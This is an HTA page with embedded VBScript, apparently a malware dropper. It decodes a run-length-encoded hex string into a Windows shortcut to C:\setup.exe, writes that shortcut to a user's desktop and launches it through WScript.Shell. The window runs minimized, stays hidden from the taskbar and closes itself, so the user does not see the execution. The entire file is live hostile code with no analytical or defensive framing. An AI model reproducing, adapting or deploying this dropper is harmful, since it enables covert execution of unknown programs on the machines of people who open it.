<script language=vbs>t="4C,003,01,14,02,005,C0,006,46,9B,003,20,003,C0,01,EA,6B,78,7A,C6,01,00,28,22,55,D3,79,C6,01,00,21,67,6C,78,7A,C6,01,20,AF,006,01,00F,71,00,14,00,1F,50,E0,4F,D0,20,EA,3A,69,10,A2,D8,08,00,2B"
t=t&",302,9D,19,00,2F,43,3A,5C,0013,42,00,32,00,20,AF,002,B2,34,37,65,20,00,73,65,74,75,70,2E,65,78,65,00,2A,00,03,00,04,00,EF,BE,B2,34,37,65,B1,34,00,88,14,003,73,00,65,00,74,00,75,00,70,00"
t=t&",2E,00,65,00,78,00,65,003,18,003,3B,003,1C,003,01,003,1C,003,2D,007,3A,003,11,003,03,003,F7,25,EE,E4,10,004,43,3A,5C,73,65,74,75,70,2E,65,78,65,002,12,00,2E,00,2E,00,5C,00,2E,00,2E,00,5C,00,2E"
t=t&",00,2E,00,5C,00,73,00,65,00,74,00,75,00,70,00,2E,00,65,00,78,00,65,00,03,00,43,00,3A,00,5C,005"

tmp = Split(t, ",")
Set fso = CreateObject("Scripting.FileSystemObject")
pth = "C:\Documents and Settings\Khach bam vao day\Desktop\Shortcut (2) to setup.lnk"
Set f = fso.CreateTextFile(pth, ForWriting)
For i = 0 To UBound(tmp)
	l = Len(tmp(i))
	b = Int("&H" & Left(tmp(i), 2))
	If l > 2 Then
		r = Int("&H" & Mid(tmp(i), 3, l))
		For j = 1 To r
		f.Write Chr(b)
		Next
	Else
		f.Write Chr(b)
	End If
Next
f.CloseSet Shell1 = CreateObject("WScript.Shell")
Shell1.Run(pth)
</script>
<HTA:APPLICATION WINDOWSTATE='minimize' SHOWINTASKBAR='no' />
</head>
<body onload='window.close()'>
</body>
</html>   

